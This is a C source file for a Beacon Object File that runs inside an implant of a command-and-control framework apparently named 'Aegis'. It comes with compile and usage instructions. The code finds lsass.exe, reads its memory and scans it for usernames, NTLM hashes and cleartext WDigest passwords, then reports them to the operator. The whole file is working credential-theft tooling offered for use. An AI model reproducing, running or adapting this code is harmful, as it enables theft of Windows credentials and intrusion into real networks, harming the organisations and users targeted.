/*
 * lsass_dump.c — Beacon Object File for LSASS credential extraction.
 *
 * Reads lsass.exe memory via VirtualQueryEx + ReadProcessMemory,
 * scans for credential patterns (MSV1_0, WDigest, Kerberos).
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -c lsass_dump.c -o lsass_dump.o
 *
 * Usage in Aegis:
 *   bof go lsass_dump.o
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

/* ===== Beacon format types (matching loader) ===== */
typedef struct {
    char* original;
    char* buffer;
    char* ptr;
    int length;
} formatp;

/* ===== Beacon API declarations ===== */
extern void BeaconPrintf(char* fmt, ...);
extern void BeaconOutput(int type, char* data, int len);
extern void BeaconDataParse(formatp* fmt, char* buf, int size);
extern int BeaconDataLength(formatp* fmt);
extern char* BeaconDataPtr(formatp* fmt, int size);
extern int BeaconDataInt(formatp* fmt);

/* Output types */
#define CALLBACK_OUTPUT    0
#define CALLBACK_ERROR     4

/* ===== Constants ===== */
#define MEM_COMMIT                0x1000
#define PAGE_NOACCESS             0x01
#define PAGE_GUARD                0x100

/* ===== Helper: check if byte is printable ASCII ===== */
static BOOL isPrintable(BYTE b) {
    return b >= 0x20 && b <= 0x7E;
}

/* ===== Helper: check if string is username-like ===== */
static BOOL isUsernameLike(const char* s, int len) {
    if (len < 2 || len > 30) return FALSE;
    if (s[0] != '$' && (s[0] < 'A' || s[0] > 'z')) return FALSE;
    int alphaNum = 0;
    for (int i = 0; i < len; i++) {
        char c = s[i];
        if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
            (c >= '0' && c <= '9') || c == '_' || c == '-' || c == '$' || c == '@') {
            alphaNum++;
        }
    }
    return (alphaNum * 100 / len) >= 80;
}

/* ===== Helper: check if 16-byte chunk looks like NTLM hash ===== */
static BOOL isNTLMHash(const BYTE* data) {
    int allZero = 1, allSame = 1, nonZero = 0;
    for (int i = 0; i < 16; i++) {
        if (data[i] != 0) allZero = 0;
        if (i > 0 && data[i] != data[0]) allSame = 0;
        if (data[i] != 0) nonZero++;
    }
    return !allZero && !allSame && nonZero >= 14;
}

/* ===== Helper: check if string looks like a password ===== */
static BOOL isPasswordLike(const char* s, int len) {
    if (len < 4 || len > 60) return FALSE;
    int hasLower = 0, hasUpper = 0, hasDigit = 0;
    for (int i = 0; i < len; i++) {
        char c = s[i];
        if (c < 0x20 || c > 0x7E) return FALSE;
        if (c >= 'a' && c <= 'z') hasLower = 1;
        if (c >= 'A' && c <= 'Z') hasUpper = 1;
        if (c >= '0' && c <= '9') hasDigit = 1;
    }
    return hasLower && (hasUpper || hasDigit);
}

/* ===== Find LSASS PID ===== */
static DWORD findLSASSPID(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

/* ===== Extract wide string from buffer ===== */
static int extractWideString(const BYTE* data, int offset, int dataLen, char* out, int outMax) {
    int j = 0;
    for (int i = offset; i + 1 < dataLen && j < outMax - 1; i += 2) {
        if (data[i] == 0 && data[i + 1] == 0) break;
        BYTE lo = data[i], hi = data[i + 1];
        if (lo < 0x20 || lo > 0x7E || hi != 0) break;
        out[j++] = (char)lo;
    }
    out[j] = 0;
    return j;
}

/* ===== Scan a memory chunk for credentials ===== */
static int scanChunk(const BYTE* buf, SIZE_T bufLen, SIZE_T globalOffset) {
    int count = 0;

    for (SIZE_T i = 0; i + 128 < bufLen && count < 20; i++) {
        if (!isPrintable(buf[i]) || buf[i + 1] != 0) continue;

        char username[64] = {0};
        int ulen = extractWideString(buf, (int)i, (int)bufLen, username, sizeof(username));
        if (ulen < 2 || !isUsernameLike(username, ulen)) continue;

        /* Search for NTLM hash nearby */
        int searchStart = (i > 512) ? (int)(i - 512) : 0;
        int searchEnd = (int)(i + 512 < bufLen ? i + 512 : bufLen);

        for (int j = searchStart; j + 16 < searchEnd; j++) {
            if (isNTLMHash(&buf[j])) {
                char hashStr[33];
                static const char hex[] = "0123456789abcdef";
                for (int k = 0; k < 16; k++) {
                    hashStr[k * 2] = hex[buf[j + k] >> 4];
                    hashStr[k * 2 + 1] = hex[buf[j + k] & 0x0F];
                }
                hashStr[32] = 0;

                /* Look for nearby password (WDigest) */
                char password[64] = {0};
                for (int p = searchStart; p + 8 < searchEnd; p++) {
                    if (!isPrintable(buf[p]) || buf[p + 1] != 0) continue;
                    int plen = extractWideString(buf, p, (int)bufLen, password, sizeof(password));
                    if (isPasswordLike(password, plen) && strcmp(password, username) != 0) {
                        break;
                    }
                    password[0] = 0;
                }

                char line[256];
                if (password[0]) {
                    _snprintf(line, sizeof(line), "[+] %-30s  NTLM: %-32s  PWD: %s\n",
                              username, hashStr, password);
                } else {
                    _snprintf(line, sizeof(line), "[+] %-30s  NTLM: %s\n",
                              username, hashStr);
                }
                BeaconPrintf("%s", line);
                count++;
                break;
            }
        }
    }

    return count;
}

/* ===== Main entry point ===== */
void go(char* args, int alen) {
    BeaconPrintf("[*] LSASS credential extraction BOF starting...\n");

    /* Step 1: Find LSASS PID */
    DWORD lsassPID = findLSASSPID();
    if (lsassPID == 0) {
        BeaconPrintf("[!] Could not find lsass.exe\n");
        return;
    }
    BeaconPrintf("[*] Found lsass.exe PID: %lu\n", lsassPID);

    /* Step 2: Open lsass.exe */
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPID);
    if (!hProcess) {
        DWORD err = GetLastError();
        BeaconPrintf("[!] OpenProcess failed: %lu (try running as SYSTEM)\n", err);
        return;
    }

    /* Step 3: Enumerate and read memory */
    int totalCreds = 0;
    LPVOID addr = NULL;

    while (totalCreds < 50) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T ret = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));
        if (ret == 0) break;

        /* Only scan committed, readable regions */
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_NOACCESS) == 0 &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            mbi.RegionSize > 0 && mbi.RegionSize < 0x10000000) {

            SIZE_T readSize = mbi.RegionSize;
            if (readSize > 0x200000) readSize = 0x200000; /* Cap at 2MB per region */

            BYTE* buf = (BYTE*)malloc(readSize);
            if (buf) {
                SIZE_T bytesRead = 0;
                if (ReadProcessMemory(hProcess, mbi.BaseAddress, buf, readSize, &bytesRead) && bytesRead > 128) {
                    totalCreds += scanChunk(buf, bytesRead, (SIZE_T)mbi.BaseAddress);
                }
                free(buf);
            }
        }

        addr = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize);
        if ((SIZE_T)addr <= (SIZE_T)mbi.BaseAddress) break;
    }

    CloseHandle(hProcess);

    if (totalCreds == 0) {
        BeaconPrintf("[*] No credentials found in LSASS memory.\n");
    } else {
        BeaconPrintf("[*] Extracted %d credentials from LSASS.\n", totalCreds);
    }
}
